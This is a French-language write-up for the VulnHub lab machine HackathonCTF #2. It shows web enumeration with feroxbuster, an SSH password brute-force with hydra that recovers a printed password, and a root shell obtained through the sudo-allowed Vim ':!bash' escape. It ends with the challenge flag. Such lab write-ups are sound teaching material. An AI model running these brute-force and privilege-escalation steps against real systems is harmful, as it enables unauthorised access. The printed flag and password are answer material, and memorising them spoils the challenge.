---
title: "Solution du CTF HackathonCTF #2 de VulnHub"
tags: [CTF, VulnHub]
---

[HackathonCTF #2](https://vulnhub.com/entry/hackathonctf-2,714/) est un CTF très simple à l'instar de son prédécesseur.

J'énumère le serveur web à l'aide de `feroxbuster` :

```bash
feroxbuster -u http://192.168.56.202/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt -n -t 30 -x php,html,txt,zip
```

Je découvre comme ça un fichier à l'adresse `/happy`

```html
<html>
<title>happy</title>

<body><h1> Nothing is in here</h1></body>

<!-- username: hackathonll >

</html>
```

Il y a aussi un fichier `word.dir` présent sur le serveur FTP qui autorise les connexions anonymes.

On va s'en servir de wordlist pour l'utilisateur `hackathonll` :

```console
$ hydra -l hackathonll -P word.dir ssh://192.168.56.202:7223
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 110 login tries (l:1/p:110), ~7 tries per task
[DATA] attacking ssh://192.168.56.202:7223/
[7223][ssh] host: 192.168.56.202   login: hackathonll   password: Ti@gO
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
```

Cet utilisateur peut exécuter Vim avec les droits `root` :

```console
$ sudo -l
Matching Defaults entries for hackathonll on hackathon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hackathonll may run the following commands on hackathon:
    (root) NOPASSWD: /usr/bin/vim
```

Une méthode bien connue d'échapper vers un shell depuis Vim et d'utiliser `:!bash` :

```console
$ sudo /usr/bin/vim     
--- snip :!bash snip ---
root@hackathon:/home/hackathonll# id
uid=0(root) gid=0(root) groups=0(root)
root@hackathon:/home/hackathonll# cd /root
root@hackathon:~# ls
flag2.txt  snap
root@hackathon:~# cat flag2.txt
₣Ⱡ₳₲{7e3c118631b68d159d9399bda66fc694}
```
